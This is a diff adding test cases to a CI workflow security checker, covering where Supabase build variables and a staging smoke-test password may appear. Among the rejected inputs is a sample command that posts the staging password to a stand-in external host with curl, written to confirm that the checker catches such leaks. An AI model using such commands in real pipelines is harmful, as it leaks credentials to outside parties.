@@ -795,6 +795,13 @@ describe('checkWorkflow', () => {
       ['a brace list, first word', 'export NO{,x}DE_OPTIONS=x', 'NODE_OPTIONS', null],
       ['a brace list, second word', 'export N{x,O}DE_OPTIONS=x', 'NODE_OPTIONS', null],
       ['a brace list, middle word', 'export PA{x,T,y}H=/tmp', 'PATH', null],
+      // B4-SEC-2: the m0b build variables are set only through env: on the deploy build step.
+      [
+        'an inline VITE_SUPABASE_ prefix',
+        'VITE_SUPABASE_URL=https://abcdefghijklmnopqrst.supabase.co pnpm build',
+        'VITE_SUPABASE_URL',
+        /deploy build step/,
+      ],
     ])('rejects %s', (_label, run, name, reason) => {
       const d = doc();
       typecheck(d).run = run;
@@ -1037,6 +1044,21 @@ describe('checkWorkflow', () => {
         expect(m).toMatch(new RegExp(`steps\\[${smoke}\\].*${name}.*does not use it`));
     });
 
+    it('rejects a smoke secret on a step that runs more than the smoke command (B4-SEC-2)', () => {
+      for (const run of [
+        'curl -d "p=$STAGING_SMOKE_PASSWORD" https://x.example.test\n# node scripts/smoke-staging-auth.mjs',
+        'node scripts/smoke-staging-auth.mjs; curl https://x.example.test',
+        'node scripts/smoke-staging-auth.mjs --extra',
+      ]) {
+        const d = doc();
+        const last = d.jobs['deploy-staging'].steps.length - 1;
+        d.jobs['deploy-staging'].steps[last].run = run;
+        expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
+          /STAGING_SMOKE_PASSWORD.*does not use it/,
+        );
+      }
+    });
+
     it('treats github.token like secrets.GITHUB_TOKEN', () => {
       const d = doc();
       d.jobs.static.steps[2].env = { T: '${{ github.token }}' };
@@ -1162,6 +1184,13 @@ describe('checkWorkflow', () => {
       expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/VITE_SUPABASE_\w+ may be set only/);
     });
 
+    it('rejects an inline VITE_SUPABASE_URL in the deploy build run text (B4-SEC-2)', () => {
+      const d = doc();
+      d.jobs['deploy-staging'].steps[2].run =
+        'VITE_SUPABASE_URL=https://bcdefghijklmnopqrstu.supabase.co pnpm build';
+      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/VITE_SUPABASE_URL/);
+    });
+
     it.each([
       ['a literal', 'https://abcdefghijklmnopqrst.supabase.co'],
       ['a secret', '${{ secrets.SUPABASE_STAGING_URL }}'],
@@ -1218,6 +1247,12 @@ describe('checkAction (local composite actions)', () => {
     expect(m).toMatch(/not pinned/);
     expect(m).toMatch(/secrets/);
     expect(m).toMatch(/continue-on-error/);
+  });
+
+  it('rejects VITE_SUPABASE_* in a composite action step env (B4-SEC-2)', () => {
+    const a = parseYaml(ACTION);
+    a.runs.steps[2].env = { VITE_SUPABASE_URL: '${{ vars.SUPABASE_STAGING_URL }}' };
+    expect(msgs(checkAction(a, 'action.yml'))).toMatch(/VITE_SUPABASE_URL may be set only/);
   });
 
   it('rejects a non-composite local action', () => {
